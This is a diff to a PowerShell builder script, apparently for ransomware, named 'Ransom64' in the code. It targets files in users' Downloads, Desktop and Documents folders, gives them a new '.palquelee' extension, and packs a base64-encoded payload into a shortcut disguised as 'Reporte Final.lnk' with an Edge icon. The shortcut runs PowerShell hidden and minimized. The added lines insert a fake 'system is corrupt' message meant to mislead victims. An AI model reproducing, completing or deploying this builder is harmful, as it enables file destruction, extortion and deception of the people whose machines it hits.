@@ -6,6 +6,7 @@ $dirs = "(Downloads|Desktop|Documents)"
 $ext = @(".doc", ".docx", ".xls", ".xlsx", ".csv", ".ppt", ".pptx", ".msg", ".eml", ".pdf", ".txt", ".exe", ".bat", ".com", ".zip", ".rar", ".7z", ".jpg", ".jpeg", ".png", ".gif", ".bmp", ".svg");
 $final_ext = ".palquelee"
 $archivo_lnk = "Reporte Final.lnk"
+$mensaje_final = "Ocurrió un error, el sistema esta corrupto.`nThere is an error the system is corrupt."
 #####
 
 #####
@@ -30,7 +31,7 @@ $ext = "'" + ($ext | ConvertTo-Json -Compress) + "' | ConvertFrom-Json"
 $cont = $cont.Replace("{{DIRECTORIOS}}", $dirs)
 $cont = $cont.Replace("{{LISTADO_EXTENSIONES}}",$ext)
 $cont = $cont.Replace("{{EXTENSION_FINAL}}", $final_ext)
-$cont
+$cont = $cont.Replace("{{MENSAJE_FINAL}}", $mensaje_final)
 $cont = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($cont));
 
 pylnk3 c --arguments "-WindowStyle hidden -e $cont" --icon "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --icon-index 13 --mode "Minimized" --description "Ransom64" "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" $output$archivo_lnk
